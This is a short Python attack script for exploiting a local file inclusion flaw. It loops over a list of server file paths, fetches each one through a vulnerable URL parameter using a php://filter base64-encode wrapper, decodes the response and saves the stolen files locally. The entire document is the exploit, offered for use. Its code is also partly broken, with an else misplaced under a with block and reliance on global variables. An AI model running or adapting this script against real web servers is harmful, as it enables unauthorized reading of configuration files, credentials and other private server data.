import requests
import time
import urllib
import base64
import os.path
import argparse

parser = argparse.ArgumentParser(description='Abuse LFI through PHP filters')
parser.add_argument('url', type=str, help='URL including the vulnerable parameter at the end')
parser.add_argument('begin', type=str, default="[(")
parser.add_argument('end', type=str, default=")]")
args = parser.parse_args()


files = set()
with open('files.txt') as f:
    for line in f:
      if (line[0] != "#"):
        files.add(line.rstrip(' ').rstrip('\n'))

print(files)
print("\n-----")

# TODO: replace with the appropriate code the exploit this particular vulnerability
def exploitLFI(URL, begin, end):
  repla = requests.get(URL + "php://filter/read=convert.base64-encode/resource=" + urllib.quote_plus(lfi))
  if (repla.status_code == 200):
    base64encoded = repla.text.split(begin)[1]
    base64encoded = base64encoded.split(end)[0]
    print("FILE : " + lfi)
    content=base64.b64decode(base64encoded)
    print(content)
    with open(fn, "w") as f:
      f.write(content)
      print("---------------")
    else:
      print("STATUS : " + str(repla.status_code))

count = 0
for lfi in files:
    print("Still trying.. " + lfi)
    time.sleep(0.05)
    fn = lfi.split("/")[-1] + ".BAR"
    if (not (os.path.isfile(fn))):
      exploitLFI(args.url, args.begin, args.end)
    count = count + 1

